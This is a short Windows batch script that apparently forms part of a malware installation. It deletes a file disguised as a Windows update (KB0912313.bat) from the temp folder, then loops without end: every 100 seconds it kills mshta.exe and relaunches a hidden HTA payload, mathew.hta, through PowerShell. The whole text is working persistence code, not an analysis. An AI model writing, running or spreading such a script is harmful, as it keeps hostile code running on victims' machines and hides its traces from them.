cd %tmp% && del KB0912313.bat
:top3 
timeout /t 100 & 
taskkill /IM mshta.exe /F 
powershell invoke-expression 'mshta %tmp%/mathew.hta' 
goto top3
